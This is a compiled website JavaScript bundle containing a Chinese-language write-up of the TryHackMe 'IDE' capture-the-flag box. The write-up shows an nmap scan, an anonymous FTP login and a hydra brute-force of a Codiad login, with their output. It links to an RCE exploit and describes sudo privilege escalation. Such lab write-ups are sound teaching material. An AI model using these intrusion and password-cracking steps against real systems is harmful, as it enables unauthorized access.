"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[7814],{9149:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>p,frontMatter:()=>a,metadata:()=>i,toc:()=>d});var s=t(74848),r=t(28453);const a={sidebar_position:48,tags:["Easy","Linux","\u533f\u540d\u8eab\u4efd\u767b\u9646-Redis","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u4fe1\u606f\u6cc4\u9732","SUDO"],title:"IDE",description:"IDE",sidebar_label:"IDE",slug:"/tryhackme/48"},o="IDE",i={id:"box/TryHackMe/48",title:"IDE",description:"IDE",source:"@site/docs/box/TryHackMe/48.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/48",permalink:"/docs/tryhackme/48",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u533f\u540d\u8eab\u4efd\u767b\u9646-Redis",permalink:"/docs/tags/\u533f\u540d\u8eab\u4efd\u767b\u9646-redis"},{label:"\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7",permalink:"/docs/tags/\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7"},{label:"\u4fe1\u606f\u6cc4\u9732",permalink:"/docs/tags/\u4fe1\u606f\u6cc4\u9732"},{label:"SUDO",permalink:"/docs/tags/sudo"}],version:"current",sidebarPosition:48,frontMatter:{sidebar_position:48,tags:["Easy","Linux","\u533f\u540d\u8eab\u4efd\u767b\u9646-Redis","\u5bc6\u7801\u7834\u89e3-\u8d26\u53f7","\u4fe1\u606f\u6cc4\u9732","SUDO"],title:"IDE",description:"IDE",sidebar_label:"IDE",slug:"/tryhackme/48"},sidebar:"boxSidebar",previous:{title:"Jack-of-All-Trades",permalink:"/docs/tryhackme/47"},next:{title:"Anonforce",permalink:"/docs/tryhackme/49"}},c={},d=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"FTP - 21",id:"ftp---21",level:2},{value:"62337",id:"62337",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; drac",id:"www-data--drac",level:3},{value:"drac --&gt; root",id:"drac----root",level:3}];function l(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",...(0,r.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"ide",children:"IDE"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-135-46:~/ide/CVE-2021-41773# nmap -sTCV -p 21,22,80,62337 --min-rate 1000 10.10.215.137\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-08-30 11:54 BST\nNmap scan report for ip-10-10-215-137.eu-west-1.compute.internal (10.10.215.137)\nHost is up (0.00019s latency).\n\nPORT      STATE SERVICE VERSION\n21/tcp    open  ftp     vsftpd 3.0.3\n|_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n| ftp-syst: \n|   STAT: \n| FTP server status:\n|      Connected to ::ffff:10.10.135.46\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 e2:be:d3:3c:e8:76:81:ef:47:7e:d0:43:d4:28:14:28 (RSA)\n|   256 a8:82:e9:61:e4:bb:61:af:9f:3a:19:3b:64:bc:de:87 (ECDSA)\n|_  256 24:46:75:a7:63:39:b6:3c:e9:f1:fc:a4:13:51:63:20 (EdDSA)\n80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n62337/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Codiad 2.8.4\nMAC Address: 02:57:6D:63:B9:47 (Unknown)\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.38 seconds\n"})}),"\n",(0,s.jsx)(n.h2,{id:"ftp---21",children:"FTP - 21"}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528\u533f\u540d\u8eab\u4efd\u8ba4\u8bc1\u767b\u9646 FTP \u670d\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-135-46:~/ide# ftp 10.10.215.137\nConnected to 10.10.215.137.\n220 (vsFTPd 3.0.3)\nName (10.10.215.137:root): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n226 Directory send OK.\nftp> ls -al\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 0        114          4096 Jun 18  2021 .\ndrwxr-xr-x    3 0        114          4096 Jun 18  2021 ..\ndrwxr-xr-x    2 0        0            4096 Jun 18  2021 ...\n226 Directory send OK.\nftp> cd ...\n250 Directory successfully changed.\nftp> ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             151 Jun 18  2021 -\n226 Directory send OK.\nftp> ls -al\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 0        0             151 Jun 18  2021 -\ndrwxr-xr-x    2 0        0            4096 Jun 18  2021 .\ndrwxr-xr-x    3 0        114          4096 Jun 18  2021 ..\n226 Directory send OK.\nftp> get -\nlocal: ./- remote: -\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for - (151 bytes).\n226 Transfer complete.\n151 bytes received in 0.00 secs (77.8158 kB/s)\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u8fd9\u91cc\u6211\u83b7\u53d6\u5230\u4e00\u4e2a\u540d\u79f0\u4e3a ",(0,s.jsx)(n.strong,{children:"-"})," \u7684\u6587\u4ef6, \u8fd9\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u540d\u5b57"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-135-46:~/ide# cat ./-\nHey john,\nI have reset the password as you have asked. Please use the default password to login. \nAlso, please take care of the image file ;)\n- drac.\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u67e5\u770b\u5185\u5bb9\u5f97\u77e5 john \u7528\u6237\u4f7f\u7528\u7684\u5bc6\u7801\u662f\u5f31\u5bc6\u7801, \u63a5\u7740\u6211\u67e5\u770b 80 \u7aef\u53e3\u4f46\u662f\u4ec0\u4e48\u4e5f\u6ca1\u6709\u8fd9\u65f6\u5019\u6211\u67e5\u770b 62337 \u7aef\u53e3"}),"\n",(0,s.jsx)(n.h2,{id:"62337",children:"62337"}),"\n",(0,s.jsx)(n.p,{children:"\u8bbf\u95ee\u8be5\u7aef\u53e3\u6211\u53d1\u73b0\u8fd9\u662f\u4e00\u4e2a\u540d\u4e3a Codiad \u7684 CMS , \u56e0\u4e3a\u4e4b\u524d\u544a\u8bc9 john \u7684\u5bc6\u7801\u88ab\u8bbe\u7f6e\u4e3a\u9ed8\u8ba4\u5bc6\u7801\u6240\u4ee5\u5c1d\u8bd5\u66b4\u529b\u7834\u89e3"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'root@ip-10-10-135-46:~/ide# hydra -L user.txt -P `locate rockyou.txt` -f 10.10.215.137 -s 62337  http-form-post "/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:F=Incorrect Username or Password"\nHydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (http://www.thc.org/thc-hydra) starting at 2023-08-30 12:08:31\n[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688796 login tries (l:2/p:14344398), ~1793050 tries per task\n[DATA] attacking http-post-form://10.10.215.137:62337//components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:F=Incorrect Username or Password\n[62337][http-post-form] host: 10.10.215.137   login: john   password: password\n[STATUS] attack finished for 10.10.215.137 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra) finished at 2023-08-30 12:08:44\n'})}),"\n",(0,s.jsxs)(n.p,{children:["\u540c\u65f6\u6211\u53d1\u73b0\u8fd9\u4e2a CMS \u8be5\u7248\u672c\u5b58\u5728 RCE \u6f0f\u6d1e ",(0,s.jsx)(n.a,{href:"https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit",children:"Codiad-Remote-Code-Execute-Exploit"}),", \u6211\u53ef\u4ee5\u5229\u7528\u6b64\u6765\u8fdb\u884c\u83b7\u53d6 Shell"]}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(n.p,{children:"\u901a\u8fc7\u811a\u672c\u6211\u83b7\u53d6\u5230\u4e86\u7528\u6237\u7684 Shell, \u5728\u8fd9\u91cc\u6211\u53d1\u73b0 drac \u7528\u6237\u7684 .bash_history \u6587\u4ef6\u662f\u53ef\u4ee5\u67e5\u770b\u7684, \u5e76\u4e14\u5728\u8fd9\u91cc\u53d1\u73b0\u4e86\u7528\u6237 drac \u7684\u5bc6\u7801"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240630231039.png",alt:"20240630231039"})}),"\n",(0,s.jsx)(n.h3,{id:"www-data--drac",children:"www-data \u2014> drac"}),"\n",(0,s.jsx)(n.p,{children:"\u4f7f\u7528\u5f97\u5230\u7684\u5bc6\u7801\u8fdb\u884c SSH \u8fde\u63a5\u5373\u53ef, \u6211\u53d1\u73b0\u7528\u6237\u5177\u6709 SUDO \u7279\u6743"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240630231101.png",alt:"20240630231101"})}),"\n",(0,s.jsxs)(n.p,{children:["\u67e5\u627e\u53d1\u73b0\u76f8\u5173\u7684\u5229\u7528\u65b9\u6cd5 ",(0,s.jsx)(n.a,{href:"https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-service-privilege-escalation/",children:"Sudo Service Privilege Escalation"})]}),"\n",(0,s.jsx)(n.h3,{id:"drac----root",children:"drac --\x3e root"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240630231139.png",alt:"20240630231139"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240630231146.png",alt:"20240630231146"})})]})}function p(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>i});var s=t(96540);const r={},a=s.createContext(r);function o(e){const n=s.useContext(a);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),s.createElement(a.Provider,{value:n},e.children)}}}]);